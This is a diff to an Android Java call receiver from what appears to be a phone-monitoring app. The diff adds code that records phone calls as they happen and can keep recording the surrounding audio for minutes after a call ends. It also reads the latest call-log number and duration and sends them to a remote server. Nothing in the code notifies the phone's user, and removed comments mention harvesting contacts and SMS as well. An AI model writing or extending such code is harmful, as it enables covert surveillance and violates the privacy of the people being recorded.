@@ -1,80 +1,91 @@
 package com.inet.android.call;
 
-import java.text.SimpleDateFormat;
-import java.util.Calendar;
+import java.util.Timer;
+import java.util.TimerTask;
 import java.util.concurrent.TimeUnit;
 
-import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 
-import android.annotation.SuppressLint;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
-import android.content.SharedPreferences;
 import android.database.Cursor;
-import android.preference.PreferenceManager;
+import android.os.Bundle;
 import android.provider.CallLog;
 import android.telephony.TelephonyManager;
 
-import com.inet.android.request.DataRequest;
+import com.inet.android.audio.RecordAudio;
+import com.inet.android.request.ConstantValue;
+import com.inet.android.request.RequestList;
+import com.inet.android.utils.ConvertDate;
 import com.inet.android.utils.Logging;
-import com.inet.android.utils.WorkTimeDefiner;
+import com.inet.android.utils.ValueWork;
 
 /**
- * Класс сбора звонков
+ * Class get call
  * 
  * @author johny homicide
  * 
  */
 public class CallReceiver extends BroadcastReceiver {
-	private Context ctx;
-	private String date;
-	private SharedPreferences sp;
-	private static String LOG_TAG = "callReceiver";
+	private static Context mContext;
+	private static RecordAudio recordAudio = null;
+	private static String LOG_TAG = CallReceiver.class.getSimpleName()
+			.toString();
+	private final static int SOURCE_RECORD = 4;
 
 	@Override
-	public void onReceive(Context arg0, Intent intent) {
-		sp = PreferenceManager.getDefaultSharedPreferences(arg0);
-		String call = sp.getString("call", "0");
+	public void onReceive(Context context, Intent intent) {
+		CallReceiver.mContext = context;
+		Logging.doLog(LOG_TAG,
+				"intent: " + intent.getAction() + " " + intent.getExtras(),
+				"intent: " + intent.getAction() + " " + intent.getExtras());
 
-		if (call.equals("0")) {
-			Logging.doLog(LOG_TAG, "call : 0", "call : 0");
+		if (ValueWork.getState(ConstantValue.TYPE_INCOMING_CALL_REQUEST,
+				mContext) == 0)
 			return;
+
+		Bundle bundle = intent.getExtras();
+		String callingSIM = String.valueOf(bundle.getInt("simId", -1));
+		if (callingSIM == "0") {
+			// Incoming call from SIM1
+			Logging.doLog(LOG_TAG, "sim1", "sim1");
+		} else if (callingSIM == "1") {
+			// Incoming call from SIM2
+			Logging.doLog(LOG_TAG, "sim2", "sim2");
 		}
-		boolean isWork = WorkTimeDefiner.isDoWork(arg0);
-		if (!isWork) {
-			Logging.doLog(LOG_TAG, "isWork return " + Boolean.toString(isWork),
-					"isWork return " + Boolean.toString(isWork));
-			Logging.doLog(LOG_TAG, "after isWork retrun 0",
-					"after isWork retrun 0");
-
-			return;
-		} else {
-			Logging.doLog(LOG_TAG, "isWork - " + Boolean.toString(isWork),
-					"isWork - " + Boolean.toString(isWork));
-		}
-
-		date = logTime();
-		ctx = arg0;
-
 		if (intent.getAction()
 				.equals("android.intent.action.NEW_OUTGOING_CALL")) {
 			// получаем исходящий номер
+			Logging.doLog(LOG_TAG, "android.intent.action.NEW_OUTGOING_CALL ",
+					"android.intent.action.NEW_OUTGOING_CALL");
+
 		} else if (intent.getAction().equals(
 				"android.intent.action.PHONE_STATE")) {
 			String phoneState = intent
 					.getStringExtra(TelephonyManager.EXTRA_STATE);
+			Logging.doLog(LOG_TAG, "android.intent.action.PHONE_STATE ",
+					"android.intent.action.PHONE_STATE");
+
 			if (phoneState.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
 				// телефон звонит, получаем входящий номер
+				Logging.doLog(LOG_TAG, "EXTRA_STATE_RINGING ",
+						"EXTRA_STATE_RINGING - ");
 
 			} else if (phoneState.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
+				Logging.doLog(LOG_TAG, "TelephonyManager.EXTRA_STATE_OFFHOOK ",
+						"TelephonyManager.EXTRA_STATE_OFFHOOK");
+
+				setRecord();
 				// телефон находится в режиме звонка (набор номера / разговор)
 			} else if (phoneState.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
 				// телефон находится в ждущем режиме (событие наступает по
 				// окончании разговора,
 				// когда уже знаем номер и факт звонка
+				Logging.doLog(LOG_TAG, "EXTRA_STATE_IDLE " + recordAudio,
+						"EXTRA_STATE_IDLE - " + recordAudio);
+				stopRecord();
 				try {
 					// TimeUnit.SECONDS.sleep(1);
 					TimeUnit.MILLISECONDS.sleep(1000);
@@ -86,91 +97,98 @@ public class CallReceiver extends BroadcastReceiver {
 		}
 	}
 
+	private static void setRecord() {
+		if (ValueWork.getMethod(ConstantValue.RECORD_CALL, mContext) == 0)
+			return;
+		recordAudio = new RecordAudio(-1, SOURCE_RECORD, mContext);
+		recordAudio.executeRecording();
+	}
+
+	private static void stopRecord() {
+		if (recordAudio != null) {
+		long minuteAfterCall = ValueWork.getMethod(
+					ConstantValue.RECORD_ENVORIMENT, mContext);
+		Logging.doLog(LOG_TAG, "recordAudio != null " + minuteAfterCall, "recordAudio != null " + minuteAfterCall);
+
+		
+			if (minuteAfterCall == 0) {
+				Logging.doLog(LOG_TAG, "minuteAfterCall == 0",
+						"minuteAfterCall == 0");
+				recordAudio.executeStopRecording();
+			} else {
+				Timer myTimer = new Timer(); // Создаем таймер
+				Logging.doLog(LOG_TAG, "Timer",
+						"Timer");
+				myTimer.schedule(new TimerTask() { // Определяем задачу
+							public void run() {
+								// if(current == minuteAfterCall){
+								Logging.doLog(LOG_TAG, "executeStopRecording " + recordAudio,
+										"executeStopRecording " + recordAudio);
+								recordAudio.executeStopRecording();
+								
+							};
+						}, minuteAfterCall * 60 * 1000); // интервал - 60000
+														// миллисекунд, 0
+														// миллисекунд до
+														// первого запуска.
+
+			}
+		}
+	}
+
 	private void getCallDetails() {
-//		ListApp listApp = new ListApp();
-//		listApp.getListOfInstalledApp(ctx);
-//		GetInfo getInfo = new GetInfo(ctx);
-//		getInfo.getInfo();
-//		GetContacts getCont = new GetContacts();
-//		getCont.execute(ctx);
-//		ArchiveSms arhSms = new ArchiveSms();
-//		arhSms.execute(ctx);
-//		ArchiveCall arhCall = new ArchiveCall();
-//		arhCall.execute(ctx);
-		StringBuffer sb = new StringBuffer();
-		Cursor managedCursor = ctx.getContentResolver().query(
+
+		Cursor managedCursor = mContext.getContentResolver().query(
 				CallLog.Calls.CONTENT_URI, null, null, null, null);
 
 		int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
 		int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
 		int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
 
-		sb.append("Call Details :");
-
 		managedCursor.moveToLast();
 		String phNumber = managedCursor.getString(number);
 		String callType = managedCursor.getString(type);
 		String callDuration = managedCursor.getString(duration);
-		// if (Integer.parseInt(callDuration) < 30) {
-		// callDuration = "5";
-		// }
-		String callTypeStr = null;
+		int callTypeStr = -1;
+
 		int dircode = Integer.parseInt(callType);
 
 		switch (dircode) {
 		case CallLog.Calls.OUTGOING_TYPE:
-			callTypeStr = "3";
+			callTypeStr = ConstantValue.TYPE_OUTGOING_CALL_REQUEST;
 			break;
 
 		case CallLog.Calls.INCOMING_TYPE:
-			callTypeStr = "2";
+			callTypeStr = ConstantValue.TYPE_INCOMING_CALL_REQUEST;
 			break;
 
 		case CallLog.Calls.MISSED_TYPE:
-			callTypeStr = "4";
+			callTypeStr = ConstantValue.TYPE_MISSED_CALL_REQUEST;
 			break;
 		}
 
-		sb.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- "
-				+ callType + " \nCall Date:--- " + date
-				+ " \nCall duration in sec :--- " + callDuration);
-		sb.append("\n----------------------------------");
 		managedCursor.close();
 
 		String sendJSONStr = null;
-		JSONObject jsonObject = new JSONObject();
-		JSONArray data = new JSONArray();
 		JSONObject info = new JSONObject();
 		JSONObject object = new JSONObject();
+
 		try {
-			
+
 			info.put("number", phNumber);
 			info.put("duration", callDuration);
 
-			object.put("time", date);
+			object.put("time", ConvertDate.logTime());
 			object.put("type", callTypeStr);
 			object.put("info", info);
-			data.put(object);
-			jsonObject.put("data", data);
 			// sendJSONStr = jsonObject.toString();
 			sendJSONStr = object.toString();
 		} catch (JSONException e) {
 			Logging.doLog(LOG_TAG, "json сломался", "json сломался");
 		}
 
-		Logging.doLog(LOG_TAG, sb.toString(), sb.toString());
 		Logging.doLog(LOG_TAG, sendJSONStr);
 
-		DataRequest dr = new DataRequest(ctx);
-		dr.sendRequest(sendJSONStr);
-	}
-
-	@SuppressLint("SimpleDateFormat")
-	private String logTime() {
-		SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
-		Calendar cal = Calendar.getInstance();
-		cal.setTimeInMillis(System.currentTimeMillis());
-		return "" + formatter.format(cal.getTime());
-
+		RequestList.sendDataRequest(sendJSONStr, mContext);
 	}
 }
